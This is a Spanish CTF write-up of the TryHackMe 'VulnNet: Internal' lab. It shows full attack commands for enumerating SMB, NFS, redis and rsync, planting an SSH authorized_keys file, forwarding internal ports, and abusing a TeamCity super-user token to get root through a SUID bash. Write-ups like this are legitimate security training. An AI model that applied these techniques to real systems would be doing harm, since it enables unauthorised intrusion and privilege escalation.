---
title: "VulnNet: Internal Write-Up - TryHackMe"
description: "VulnNet: Internal Write-Up - TryHackMe"
pubDatetime: 2023-09-10
tags:
  [
    "fácil",
    "tryhackme",
    "rpc",
    "smb",
    "rsync",
    "redis",
    "nfs",
    "internal ports",
    "port forwarding",
    "command injection",
  ]
---

# Reconocimiento

Empezamos con un escaneo de puertos con nmap.

```bash
❯ sudo nmap -A -p- --open 10.10.229.132
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 19:41 CEST
Nmap scan report for 10.10.229.132
Host is up (0.050s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  `f'4>V      Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open  rsync       (protocol version 31)
2049/tcp  open  nfs_acl     3 (RPC #100227)
6379/tcp  open  redis       Redis key-value store
34893/tcp open  nlockmgr    1-4 (RPC #100021)
37227/tcp open  mountd      1-3 (RPC #100005)
45081/tcp open  mountd      1-3 (RPC #100005)
58733/tcp open  mountd      1-3 (RPC #100005)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2023-09-09T17:41:35
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2023-09-09T19:41:35+02:00
|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   52.01 ms 10.9.0.1
2   52.14 ms 10.10.229.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.07 seconds
```

Tenemos muchos puertos abiertos así que vamos uno a uno.

## 139,445 - smb

Primero con `nmap` uso una serie de scripts para enumerar más a fondo el servicio SMB.

```bash
❯ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.229.132

Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 20:12 CEST
Nmap scan report for 10.10.229.132
Host is up (0.053s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.229.132\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (vulnnet-internal server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.229.132\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.229.132\shares:
|     Type: STYPE_DISKTREE
|     Comment: VulnNet Business Shares
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\opt\shares
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds
```

Veo que existe un recurso compartido **\\10.10.229.132\shares** asi que con `smbmap` veo si existen archivos/directorios interesantes en este.

```bash
❯ smbmap -H 10.10.229.132 -R shares/

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap


[+] IP: 10.10.229.132:445	Name: 10.10.229.132       	Status: Guest session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	shares                                            	READ ONLY
	.\shares\\*
	dr--r--r--                0 Tue Feb  2 10:20:09 2021	.
	dr--r--r--                0 Tue Feb  2 10:28:11 2021	..
	dr--r--r--                0 Sat Feb  6 12:45:10 2021	temp
	dr--r--r--                0 Tue Feb  2 10:27:33 2021	data
	.\shares\\temp\*
	dr--r--r--                0 Sat Feb  6 12:45:10 2021	.
	dr--r--r--                0 Tue Feb  2 10:20:09 2021	..
	fr--r--r--               38 Sat Feb  6 12:45:09 2021	services.txt
	.\shares\\data\*
	dr--r--r--                0 Tue Feb  2 10:27:33 2021	.
	dr--r--r--                0 Tue Feb  2 10:20:09 2021	..
	fr--r--r--               48 Tue Feb  2 10:21:18 2021	data.txt
	fr--r--r--              190 Tue Feb  2 10:27:33 2021	business-req.txt
```

Veo varios archivos: `services.txt`, `data.txt` y `bussiness-req.txt`.

Me los descargo todos.

```bash
❯ smbmap -H 10.10.229.132 --download shares/temp/services.txt --no-banner
[+] Starting download: shares\temp\services.txt (38 bytes)
[+] File output to: ./services.txt

❯ smbmap -H 10.10.229.132 --download shares/data/data.txt --no-banner
[+] Starting download: shares\data\data.txt (48 bytes)
[+] File output to: ./data.txt

❯ smbmap -H 10.10.229.132 --download shares/data/business-req.txt --no-banner
[+] Starting download: shares\data\business-req.txt (190 bytes)
[+] File output to: ./business-req.txt
```

```bash
❯ catp *
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
Purge regularly data that is not needed anymore
THM{0a.......................}
```

El archivo `services.txt` contiene una flag.

## 2049 - nfs_acl

Encuentro que la máquina vítima tiene un recurso compartido por NFS.

```bash
❯ showmount -e 10.10.229.132
Export list for 10.10.229.132:
/opt/conf *
```

Así que me lo monto a mi máquina.

```bash
❯ mount -t nfs 10.10.229.132:/opt/conf mnt/ -o nolock
```

```bash
❯ tree mnt/
.
├── business-req.txt
├── data.txt
├── nfs_mnt
│   ├── hp
│   │   └── hplip.conf
│   ├── init
│   │   ├── anacron.conf
│   │   ├── lightdm.conf
│   │   └── whoopsie.conf
│   ├── opt
│   ├── profile.d
│   │   ├── bash_completion.sh
│   │   ├── cedilla-portuguese.sh
│   │   ├── input-method-config.sh
│   │   └── vte-2.91.sh
│   ├── redis
│   │   └── redis.conf
│   ├── vim
│   │   ├── vimrc
│   │   └── vimrc.tiny
│   └── wildmidi
│       └── wildmidi.cfg
└── services.txt

9 directories, 15 files
```

En el archivo `redis.conf` hay credenciales para el servicio _redis_ de la máquina.

```bash
❯ cat mnt/redis/redis.conf | grep requirepass
# If the master is password protected (using the "requirepass" configuration
requirepass "B65..............."
# requirepass foobared
```

## 6379 - redis

Al intentar conectarme a Redis pide contraseña.

```bash
❯ redis-cli -h 10.10.229.132
10.10.229.132:6379> info
NOAUTH Authentication required.
```

Así que proporciono la que encontramos anteriormente.

```bash
❯ redis-cli -h 10.10.229.132
10.10.229.132:6379> info
NOAUTH Authentication required.
10.10.229.132:6379> AUTH B65..............
OK
10.10.229.132:6379> info
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-135-generic x86_64
...
```

Tenemos otra flag listando las claves en la base de datos actual.

```bash
10.10.229.132:6379> keys *
1) "internal flag"
2) "tmp"
3) "int"
4) "authlist"
5) "marketlist"
10.10.229.132:6379> get "internal flag"
"THM{ff8e.............................}"
```

Y listando el contenido de la clave **authlist** vemos lo que parece una cadena en base64.

```bash
10.10.229.132:6379> type authlist
list
10.10.229.132:6379> lrange authlist 0 0
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```

La decodificamos.

```bash
❯ echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg...........
```

Nos da una pista para nuestro siguiente paso.

## 873 - rsync

Primeramente para enumerar recursos compartidos uso nmap:

```bash
❯ nmap -sV --script "rsync-list-modules" -p873 10.10.229.132
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 20:23 CEST
Nmap scan report for 10.10.229.132
Host is up (0.053s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules:
|_  files          	Necessary home interaction

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
```

Vemos un recurso `files`. Así que intento traérmelo a mi máquina con las credenciales de antes.

```bash
❯ rsync -av rsync://rsync-connect@10.10.229.132/files ./rsync
Password:
```

Tenemos otra flag en `rsync/sys-internal/user.txt`

```bash
❯ cd rsync/sys-internal

❯ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  user.txt
```

Podemos intentar subir un archivo `authorized_keys` a la ruta `sys-internal/.ssh` para poder ganar acceso al sistema con nuestra clave privada.

Para eso generamos un nuevo par de claves SSH y copiamos nuestra clave pública a un archivo `authorized_keys`.

```bash
❯ ssh-keygen
Generating public/private rsa key pair.
...

❯ cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
```

Ahora lo subimos al servidor.

```bash
❯ rsync -av ~/.ssh/authorized_keys rsync://rsync-connect@10.10.229.132/files/sys-internal/.ssh/authorized_keys
Password:
sending incremental file list
authorized_keys


sent 676 bytes  received 35 bytes  474.00 bytes/sec
total size is 563  speedup is 0.79
```

Y nos conectamos mediante SSH sin proporcionar contraseña.

```bash
❯ ssh sys-internal@10.10.229.132
...
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@vulnnet-internal:~$ id
uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)
```

# Escalada de privilegios

Estamos dentro como el usuario `sys-internal`.

## Abriendo puertos internos

Viendo los puertos abiertos internamente vemos algunos que no vimos con el escaneo de nmap.

```bash
sys-internal@vulnnet-internal:/dev/shm$ ss -tno
State          Recv-Q      Send-Q                  Local Address:Port                    Peer Address:Port
ESTAB          0           0                       10.10.229.132:22                      10.9.102.119:37568       timer:(keepalive,94min,0)
ESTAB          0           0                  [::ffff:127.0.0.1]:47121             [::ffff:127.0.0.1]:8111
ESTAB          0           0                  [::ffff:127.0.0.1]:8111              [::ffff:127.0.0.1]:47121
CLOSE-WAIT     1           0                  [::ffff:127.0.0.1]:48639             [::ffff:127.0.0.1]:8111
```

Estos son el 47121, el 8111 y el 48639

Con SSH redirijo los puertos a mi máquina local poder analizar sus servicios cómodamente.

```bash
❯ ssh sys-internal@10.10.229.132 -L 47121:127.0.0.1:47121 -L 8111:127.0.0.1:8111 -L 48639:127.0.0.1:48639
```

Y ahora puedo hacer un escaneo con nmap a estos puertos.

```bash
❯ sudo nmap -sSCV -p47121,8111,48639 127.0.0.1
[sudo] password for ziox:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 02:37 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000027s latency).

PORT      STATE SERVICE     VERSION
8111/tcp  open  skynetflow?
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 401
|     TeamCity-Node-Id: MAIN_SERVER
|     WWW-Authenticate: Basic realm="TeamCity"
|     WWW-Authenticate: Bearer realm="TeamCity"
|     Cache-Control: no-store
|     Content-Type: text/plain;charset=UTF-8
|     Date: Sun, 10 Sep 2023 00:37:29 GMT
|     Connection: close
|     Authentication required
|     login manually go to "/login.html" page
|   RPCCheck, RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 10 Sep 2023 00:37:29 GMT
|     Connection: close
47121/tcp open  tcpwrapped
48639/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.56 seconds
```

El único interesante de momento parece el **8111** puesto que parece que corre un servicio HTTP.

![](@assets/TryHackMe/VulnNet/index.png)

Pone que no existe cuenta administradora y te redirige para loguearte como `Super user` con un supuesto token, el cual, leyendo la documentación se localiza en `/TeamCity/logs/teamcity-server.log`.

![](@assets/TryHackMe/VulnNet/superuser.png)

Pero no tengo permisos de lectura.

```bash
sys-internal@vulnnet-internal:/$ ls -la TeamCity/logs/teamcity-server.log
-rw-r----- 1 root root 185005 Sep 10 02:54 /TeamCity/logs/teamcity-server.log
```

Buscando en la ruta `/TeamCity/logs/` encuentro un archivo `catalina.out` sobre el que si tengo permisos de lectura.

```bash
sys-internal@vulnnet-internal:/$ ls -la TeamCity/logs/
total 492
drwxr-xr-x  2 root root   4096 Sep 10 00:10 .
drwxr-xr-x 12 root root   4096 Feb  6  2021 ..
-rw-r-----  1 root root  12493 Feb  6  2021 catalina.2021-02-06.log
-rw-r-----  1 root root   8132 Feb  7  2021 catalina.2021-02-07.log
-rw-r-----  1 root root   9894 Sep 10 02:37 catalina.2023-09-10.log
-rw-r--r--  1 root root 171407 Sep 10 02:54 catalina.out
...
```

Y filtrando por **token**, bingo.

```bash
sys-internal@vulnnet-internal:/$ cat TeamCity/logs/catalina.out | grep -i token
...
[TeamCity] Super user authentication token: 3827492191945456234 (use empty username with the token as the password to access the server)
```

Me autentico en la página y me redirige a `/overview.html`.

![](@assets/TryHackMe/VulnNet/overview.png)

Desde aquí puedo crear proyectos.

![](@assets/TryHackMe/VulnNet/createproject.png)

Al crear uno le asignamos un nombre, etcétera y podemos añadir instrucciones a ejecutar cuando el proyecto se inicialice.

![](@assets/TryHackMe/VulnNet/build.png)

Al crear skipeamos cuando nos pide una URL y en **Build Steps**, seleccionamos **Command Line** como Runner type y ponemos el código a ejecutar.

![](@assets/TryHackMe/VulnNet/buildsteps.png)

Guardamos y le damos a **Run** para ejecutar el "proyecto".

![](@assets/TryHackMe/VulnNet/run.png)

Cuando termine de ejecutarse nos mostrará **Success** y si todo ha ido bien deberíamos tener la bash con el bit SUID asignado por root.

![](@assets/TryHackMe/VulnNet/success.png)

![](@assets/TryHackMe/VulnNet/suid.png)

Ahora con un `bash -p` tenemos shell como root y tenemos la última flag en `/root/root.txt`

![](@assets/TryHackMe/VulnNet/root.png)

# Referencias

- [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)
